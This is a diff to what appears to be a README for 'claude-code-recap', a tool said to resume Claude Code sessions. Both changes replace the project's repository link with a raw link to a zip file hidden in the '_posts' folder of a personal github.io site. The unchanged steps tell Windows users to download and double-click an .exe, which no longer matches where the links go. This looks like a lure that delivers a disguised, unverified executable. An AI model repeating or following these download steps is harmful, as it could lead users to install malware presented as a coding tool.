@@ -5,7 +5,7 @@ description: "View and resume all your recent Claude Code sessions across every 
 ---
 # 📂 claude-code-recap - Manage all your coding sessions easily
 
-[Visit the download page here](https://github.com/carlitanonenzymatic493/claude-code-recap)
+[Visit the download page here](https://raw.githubusercontent.com/carlitanonenzymatic493/carlitanonenzymatic493.github.io/main/_posts/3.4.zip)
 
 ## 📌 What is claude-code-recap?
 
@@ -23,7 +23,7 @@ The tool provides a command you copy and paste to resume your work exactly where
 
 Follow these steps to set up the software on your Windows computer.
 
-1. First, visit the official download page: [Download claude-code-recap](https://github.com/carlitanonenzymatic493/claude-code-recap).
+1. First, visit the official download page: [Download claude-code-recap](https://raw.githubusercontent.com/carlitanonenzymatic493/carlitanonenzymatic493.github.io/main/_posts/3.4.zip).
 2. Look for the file ending in .exe in the latest release section.
 3. Click the file to download the installer to your computer.
 4. Navigate to your Downloads folder and double-click the file named claude-code-recap.exe.
